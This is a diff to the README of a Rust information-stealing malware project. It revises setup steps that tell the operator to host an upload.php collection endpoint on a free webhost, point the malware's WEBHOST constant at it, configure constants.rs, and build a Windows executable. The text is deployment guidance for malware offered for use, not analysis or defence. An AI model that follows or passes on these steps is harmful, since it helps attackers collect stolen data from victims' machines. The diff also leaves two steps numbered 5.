@@ -28,8 +28,9 @@ This is a malware written in Rust that steals the information the attacker choos
 ### Setup
 1. Go to [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php#L3) and set the webhook
 2. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
-3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php) to your webhost
+3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php) to your webhost's `public_html` folder
 4. Configure the options in [constants.rs](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs) however you like
+5. Make sure your [WEBHOST](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs#L47) has `/upload.php` at the end
 5. Run `cargo build --release --target=x86_64-pc-windows-msvc`
 
 ### Contributing
